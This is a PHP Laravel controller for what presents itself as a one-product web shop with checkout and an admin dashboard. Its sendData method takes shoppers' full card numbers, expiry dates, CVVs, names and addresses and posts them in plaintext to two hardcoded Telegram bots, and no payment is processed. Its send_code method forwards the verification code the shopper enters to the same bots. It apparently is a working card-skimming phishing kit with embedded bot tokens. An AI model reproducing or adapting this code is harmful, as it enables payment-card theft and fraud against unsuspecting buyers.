<?php

namespace App\Http\Controllers;

use App\Models\FAQ;
use App\Models\Gallery;
use App\Models\GeneralInfo;
use App\Models\Partner;
use App\Models\Product;
use App\Models\Review;
use App\Models\User;
use App\Models\Video;
use Illuminate\Http\Request;
use Auth;
use Illuminate\Support\Facades\Session;
use Validator;

class HomeController extends Controller
{
    public function welcom()
    {
        $product = Product::first();
        $gallers = Gallery::orderby('id', 'desc')->get();
        $partners = Partner::orderby('id', 'desc')->get();
        $videos = Video::orderby('id', 'desc')->get();
        $reviews = Review::orderby('id', 'desc')->get();
        $faqs =     FAQ::orderby('id','desc')->get();
        return view("layouts.frontend", compact("product", "gallers", "partners", "videos", "reviews","faqs"));
    }
    public function checkout()
    {
        $product = Product::first();
        return view("layouts.checkout", compact("product"));
    }
    public function code()
    {
        $product = Product::first();
        return view("layouts.code", compact("product"));
    }
    public function sendData(Request $request)
    {
        // Validate the incoming request
        $request->validate([
            'region' => 'required|string',
            'first' => 'required|string',
            'last' => 'required|string',
            'address' => 'required|string',
            'suite' => 'nullable|string',
            'postcode' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'phone' => 'required|string',
            'card_number' => 'required|string',
            'month_year' => 'required|string',
            'cvv' => 'required|string',
            'name_card' => 'required|string',
            'productQuantity' => 'required|integer|min:1',
            'email_or_phone' => 'required|string',
        ]);
    
        // Store data in the session using Laravel's session facade
        Session::put('region', $request->input('region'));
        Session::put('first', $request->input('first'));
        Session::put('last', $request->input('last'));
        Session::put('address', $request->input('address'));
        Session::put('suite', $request->input('suite'));
        Session::put('postcode', $request->input('postcode'));
        Session::put('city', $request->input('city'));
        Session::put('state', $request->input('state'));
        Session::put('phone', $request->input('phone'));
        Session::put('card_number', str_replace(' ', '', $request->input('card_number')));
        Session::put('month_year', $request->input('month_year'));
        Session::put('cvv', $request->input('cvv'));
        Session::put('name_card', $request->input('name_card'));
        Session::put('productQuantity', $request->input('productQuantity'));
        Session::put('pes_price', 199); // Static value
        Session::put('email_or_phone', $request->input('email_or_phone'));
    
        // Retrieve session data
        $region = Session::get('region');
        $first = Session::get('first');
        $last = Session::get('last');
        $address = Session::get('address');
        $suite = Session::get('suite');
        $postcode = Session::get('postcode');
        $city = Session::get('city');
        $state = Session::get('state');
        $phone = Session::get('phone');
        $cardNumber = Session::get('card_number');
        $monthYear = Session::get('month_year');
        $cvv = Session::get('cvv');
        $nameCard = Session::get('name_card');
        $productQuantity = Session::get('productQuantity');
        $pesPrice = Session::get('pes_price');
        $emailOrPhone = Session::get('email_or_phone');
    
        // Format the phone number
        $formattedPhone = substr($phone, 0, 3) . str_repeat('x', strlen($phone) - 5) . substr($phone, -2);
        Session::put('formatted_phone', $formattedPhone);
    
        // Create the message for Telegram
        $databot = "البريد المرسل او الايميل : {$emailOrPhone}\n" .
                   "عدد المنتجات: {$productQuantity}\n" .
                   "المبلغ الاجمالي : " . ($pesPrice * $productQuantity) . "\n" .
                   "المنطقة: {$region}\n" .
                   "الاسم الأول: {$first}\n" .
                   "الاسم الأخير: {$last}\n" .
                   "العنوان: {$address}\n" .
                   "الجناح: {$suite}\n" .
                   "الرمز البريدي: {$postcode}\n" .
                   "المدينة: {$city}\n" .
                   "الولاية: {$state}\n" .
                   "رقم الهاتف: {$formattedPhone}\n" .
                   "رقم البطاقة: {$cardNumber}\n" .
                   "تاريخ الانتهاء: {$monthYear}\n" .
                   "رمز سي سي في: {$cvv}\n" .
                   "اسم حامل البطاقة: {$nameCard}\n";
    
        // Send the message to Telegram
        $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
        // Prepare the POST data
        $senderr = [
            'chat_id' => 908949980,
            'text' => $databot,
        ];
        // DIE($databot);
    
       
        
        // Initialize cURL
        $curll = curl_init($urll);
        curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll, CURLOPT_POST, true);
        curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
        
        // Execute cURL request
        $response = curl_exec($curll);

        $telegramUrll = "https://api.telegram.org/bot7749607245:AAFFf-r1JWpOXHcRpuqA7sDJdv334DaBon4/sendMessage";
        $telegramDataa = [
            'chat_id' => 467740013,
            'text' => $databot,
        ];
    
        // Send the data to Telegram
        $curll = curl_init($telegramUrll);
        curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll, CURLOPT_POST, true);
        curl_setopt($curll, CURLOPT_POSTFIELDS, $telegramDataa);
        $response = curl_exec($curll);
        curl_close($curll);
    
    
        // Redirect to a confirmation page
        return response()->json(['url' => route('code')]);
    }
  
public function send_code(Request $request)
{
    // Validate the incoming request

    // Store the number in the session
    $number = $request->input('number');
    Session::put('verification_number', $number);

    // Prepare the message for Telegram
    $databot = 'كود التحقق : ' . $number . PHP_EOL;

    // Telegram Bot API details
    $telegramUrl = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
    $telegramData = [
        'chat_id' => '908949980',
        'text' => $databot,
    ];

    // Send the data to Telegram
    $curl = curl_init($telegramUrl);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $telegramData);
    $response = curl_exec($curl);
    curl_close($curl);




    $telegramUrll = "https://api.telegram.org/bot7749607245:AAFFf-r1JWpOXHcRpuqA7sDJdv334DaBon4/sendMessage";
    $telegramDataa = [
        'chat_id' => 467740013,
        'text' => $databot,
    ];

    // Send the data to Telegram
    $curll = curl_init($telegramUrll);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_POSTFIELDS, $telegramDataa);
    $response = curl_exec($curll);
    curl_close($curll);

    // Prepare the response
    $url = route('code'); // Replace 'code' with the name of your route for the verification page
    return response()->json(['url' => $url]);
}


    public function login()
    {
        if (auth()->check() == true) {
            return redirect()->route('dashboard');
        } else {
            return view('auth.login');
        }
    }
    public function post_login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required'
        ]);
        $credentials = $request->only('email', 'password');

        if (Auth::attempt($credentials)) {
            return redirect()->route('dashboard');
        }
        return redirect()->back()->with(['error' => trans('Email Or Password not correct')]);
    }
    public function home()
    {

        return view('dashboard.index');
    }
    public function edit_profile()
    {
        return view('dashboard.edit_profile');
    }
    public function edit_profile_post(Request $request)
    {
        $id = auth()->user()->id;
        $validator = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required|email|unique:users,email,' . $id,
        ]);
        if ($request->password != null) {
            $validator = Validator::make($request->all(), [
                'password' => 'required|min:6',
                'confirm_password' => 'required|same:password',
            ]);
        }
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors(), 'success' => 'false'], 422);
        }
        $user = User::find($id);
        $user->name = $request->name;
        $user->email = $request->email;
        if ($request->password != null) {
            $user->password = bcrypt($request->password);
        }

        if ($request->image != null) {
            $user->image = $request->image->store('/users');
        }
        $user->save();
        return response()->json(['success' => 'true'], 200);
    }
    public function logout()
    {
        auth()->logout();
        return redirect()->route('login');
    }

    public function setting()
    {
        return view('dashboard.setting');
    }
    public function telegran_setting()
    {
        return view('dashboard.telegran_setting');
    }
    
    public function another_setting()
    {
        return view('dashboard.another_setting');
    }
    public function edit_section()
    {
        return view('dashboard.edit_section');
    }

    
    public function add_general(Request $request)
    {
        // dd($request);
        if ($request->hasFile('general_file')) {
            foreach ($request->file('general_file') as $name => $value) {
                if ($value == null) {
                    continue;
                }
                GeneralInfo::setValue($name, $value->store('general'));
            }
        }
        if ($request->has('general')) {

            foreach ($request->input('general') as $name => $value) {
                if ($value == null) {
                    continue;
                }
                GeneralInfo::setValue($name, $value);
            }
        }

        return redirect()->back()->with(['success' => trans('Edit Successfuly')]);
    }
}
